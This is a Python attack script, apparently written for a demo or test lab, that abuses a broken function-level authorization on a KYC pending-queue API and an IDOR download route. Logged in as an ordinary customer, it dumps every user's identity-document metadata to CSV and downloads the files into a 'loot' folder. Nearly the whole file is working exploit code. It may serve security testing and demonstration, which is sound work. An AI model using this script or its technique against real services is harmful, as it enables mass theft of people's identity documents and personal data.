"""
kyc_pii_scrape.py — pull the whole KYC compliance queue as a plain customer.

Vuln / bot scenario:  GET /api/kyc/kyc/pending is guarded by get_current_user,
                      not require_admin (BFLA) — so any customer sees EVERY user's
                      pending identity documents. Combined with the IDOR download
                      route (GET /api/kyc/kyc/{id}/download, no ownership check),
                      a bot can enumerate and pull everyone's identity files.
F5 XC category:       API Security: Broken Function Level Authorization (BFLA) +
                      Sensitive Data Exposure.

Logs in as a customer, dumps the pending-queue metadata to CSV, and optionally
downloads the first few documents to a local folder to prove the IDOR.

Usage:
    python3 kyc_pii_scrape.py                          # metadata only
    python3 kyc_pii_scrape.py --download 2 --out-dir kyc_loot
"""

import argparse
import csv
import os
import sys
import time

sys.path.insert(0, os.path.dirname(os.path.dirname(os.path.abspath(__file__))))

from config import (BASE_URL, SEEDED_USERS, auth_headers, login, make_client)


def main():
    ap = argparse.ArgumentParser(description="BFLA KYC PII-scraping bot.")
    ap.add_argument("--user", default="alice", choices=list(SEEDED_USERS))
    ap.add_argument("--download", type=int, default=0,
                    help="also download the first N docs via the IDOR download route")
    ap.add_argument("--out", default="scraped_kyc.csv")
    ap.add_argument("--out-dir", default="kyc_loot")
    args = ap.parse_args()

    creds = SEEDED_USERS[args.user]
    print(f"Target: {BASE_URL}/api/kyc/kyc/pending  (logged in as {args.user}, a customer)")

    start = time.time()
    with make_client() as client:
        token, _ = login(client, creds["email"], creds["password"])
        hdrs = auth_headers(token)
        r = client.get("/api/kyc/kyc/pending", headers=hdrs)
        if r.status_code != 200:
            print(f"pending queue returned {r.status_code} {r.text[:120]}")
            return
        docs = r.json()

        with open(args.out, "w", newline="") as f:
            w = csv.writer(f)
            w.writerow(["id", "user_id", "doc_type", "original_filename",
                        "content_type", "size_bytes", "status", "stored_path"])
            for d in docs:
                w.writerow([d.get("id"), d.get("user_id"), d.get("doc_type"),
                            d.get("original_filename"), d.get("content_type"),
                            d.get("size_bytes"), d.get("status"), d.get("stored_path")])

        downloaded = []
        if args.download > 0:
            os.makedirs(args.out_dir, exist_ok=True)
            for d in docs[:args.download]:
                did = d.get("id")
                try:
                    dr = client.get(f"/api/kyc/kyc/{did}/download", headers=hdrs)
                except Exception as exc:  # noqa: BLE001
                    print(f"  download id {did}: ERR {exc}")
                    continue
                if dr.status_code == 200:
                    name = f"{did}_{d.get('original_filename', 'doc')}"
                    path = os.path.join(args.out_dir, name)
                    with open(path, "wb") as of:
                        of.write(dr.content)
                    downloaded.append(path)

    elapsed = time.time() - start
    owners = {d.get("user_id") for d in docs}
    print("--- report ---")
    print(f"pending docs seen: {len(docs)} across {len(owners)} distinct users "
          f"in {elapsed:.2f}s -> {args.out}")
    print(f"logged in as {args.user}, yet read the WHOLE compliance queue (BFLA).")
    for d in docs[:6]:
        print(f"  doc {d.get('id'):>3} user={str(d.get('user_id'))[:8]}.. "
              f"{d.get('doc_type'):<16} {d.get('original_filename')}")
    if downloaded:
        print(f"downloaded {len(downloaded)} file(s) via IDOR -> {downloaded}")


if __name__ == "__main__":
    main()
